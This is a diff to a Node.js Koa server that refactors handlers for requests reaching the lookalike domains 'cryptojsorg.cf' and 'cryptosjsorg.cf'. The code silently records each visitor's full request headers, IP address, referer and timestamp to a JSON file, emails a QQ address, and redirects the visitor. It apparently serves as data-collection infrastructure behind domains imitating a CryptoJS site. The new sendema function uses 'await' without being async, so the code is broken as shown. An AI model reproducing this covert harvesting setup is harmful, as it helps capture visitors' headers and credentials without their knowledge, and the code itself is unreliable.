@@ -61,6 +61,53 @@ app.use( BodyParser() );
 
 const router = new Router();
 
+function sendema(data,ctx){
+    
+    data.username="假数据"
+        
+    async function timeout() {
+        return new Promise((resolve, reject) => {
+            email.sendMail('1162212711@qq.com', '5555', (state) => {
+                resolve(state);
+            })
+        })
+    }
+    // var timeout1=util.promisify(timeout)
+    await timeout().then(state => {
+        // console.log('进来假了');
+        if (state) {
+            // console.log('进来假了111');
+            data.username="假数据1"
+            data.header=ctx.request.header;
+            data.remoteAddress=ctx.req.connection.remoteAddress;
+            data.Time=getTimeByTimeZone(8);
+            datas.todos.push(data);
+            fs.writeFileSync('./static/data/wwdata.json', JSON.stringify(datas));
+            ctx.response.redirect('http://cryptosjsorg.cf');
+            // ctx.body = "1";
+            return ;
+        } else {
+            console.log('进来假了222');
+            ctx.response.redirect('http://cryptosjsorg.cf');
+            // ctx.body = "0"
+            return ;
+        }
+    })
+}
+function addshuju(data,ctx){
+    // data.requestip=ctx.request.header.host; 
+    // data.Origin=ctx.request.header.Origin; 
+    data.header=ctx.request.header;
+    // data.ctx=ctx;
+    data.remoteAddress=ctx.req.connection.remoteAddress;
+    data.Time=getTimeByTimeZone(8);
+    // 添加ip地址
+    datas.todos.push(data);
+    fs.writeFileSync('./static/data/wwdata.json', JSON.stringify(datas));
+    // ctx.body = ' .'
+    ctx.response.redirect('http://cryptosjsorg.cf');
+}
+
 app.use(async (ctx, next)=>{
     try{
         await next();   // 执行后代的代码
@@ -73,12 +120,16 @@ app.use(async (ctx, next)=>{
             if(str1=='http://cryptojsorg.cf/static/indexww.html'){
                  ctx.body = "404"
             }else if(str.includes('cryptojsorg')){
-                ctx.response.redirect('http://cryptojsorg.cf/a?uu='+ctx.href+'&referer='+str1||'');
-                return;
+                var data = {uu:ctx.href,referer:str1||''};
+                sendema(data,ctx)
+                // ctx.response.redirect('http://cryptojsorg.cf/a?uu='+ctx.href+'&referer='+str1||'');
+                // return;
                 // ctx.response.redirect('http://cryptosjsorg.cf');
                
             }else{
-                ctx.response.redirect('http://cryptojsorg.cf/a?username=假的&uu='+ctx.href+'&referer='+str1|'');
+                var data = {uu:ctx.href,referer:str1||''};
+                addshuju(data,ctx)
+                // ctx.response.redirect('http://cryptojsorg.cf/a?username=假的&uu='+ctx.href+'&referer='+str1|'');
             }
         }
     }catch(e){
@@ -168,86 +219,44 @@ router.post('/remove', async ctx => {
 
 // router.post('/add', async ctx => {
 router.get('/a', async ctx => {
-
-
-
     let data = ctx.request.query || {};
     
     header=ctx.request.header;
     // console.log('header',header);
     // console.log('Origin',header.origin);
+
     if(!!!data.username&&!!!header.origin){
-        data.username="假数据"
-        
-        async function timeout() {
-            return new Promise((resolve, reject) => {
-                email.sendMail('1162212711@qq.com', '5555', (state) => {
-                    resolve(state);
-                })
-            })
-        }
-        // var timeout1=util.promisify(timeout)
-        await timeout().then(state => {
-            // console.log('进来假了');
-            if (state) {
-                // console.log('进来假了111');
-                data.username="假数据1"
-                data.header=ctx.request.header;
-                data.remoteAddress=ctx.req.connection.remoteAddress;
-                data.Time=getTimeByTimeZone(8);
-                datas.todos.push(data);
-                fs.writeFileSync('./static/data/wwdata.json', JSON.stringify(datas));
-                ctx.response.redirect('http://cryptosjsorg.cf');
-                // ctx.body = "1";
-                return ;
-            } else {
-                console.log('进来假了222');
-                ctx.response.redirect('http://cryptosjsorg.cf');
-                // ctx.body = "0"
-                return ;
-            }
-        })
+
+        sendema(data,ctx)
         
     }else{
         
-        // data.requestip=ctx.request.header.host; 
-        // data.Origin=ctx.request.header.Origin; 
-        data.header=ctx.request.header;
-        // data.ctx=ctx;
-        data.remoteAddress=ctx.req.connection.remoteAddress;
-        data.Time=getTimeByTimeZone(8);
-        // 添加ip地址
+        addshuju(data,ctx)
         
-        
-    
-    
-        // let title = ctx.request.body.title || '';
-        // if (!title) {
-        //     ctx.body = {
-        //         code: 1,
-        //         data: '请传入任务标题'
-        //     }
-        //     return;
-        // }
-    
-        // let newTask = {
-        //     id: ++datas._id,
-        //     title,
-        //     done: false
-        // };
-    
-        // datas.todos.push(newTask);
-        // ctx.body = {
-        //     code: 0,
-        //     data: newTask
-        // }
-        // console.log('完成');
-        
-        datas.todos.push(data);
-        fs.writeFileSync('./static/data/wwdata.json', JSON.stringify(datas));
-        // ctx.body = ' .'
-        ctx.response.redirect('http://cryptosjsorg.cf');
     }
+    
+    // let title = ctx.request.body.title || '';
+    // if (!title) {
+    //     ctx.body = {
+    //         code: 1,
+    //         data: '请传入任务标题'
+    //     }
+    //     return;
+    // }
+
+    // let newTask = {
+    //     id: ++datas._id,
+    //     title,
+    //     done: false
+    // };
+
+    // datas.todos.push(newTask);
+    // ctx.body = {
+    //     code: 0,
+    //     data: newTask
+    // }
+    // console.log('完成');
+    // ctx.body = ' .'
 });
 
 router.get('/dssa', async ctx => {
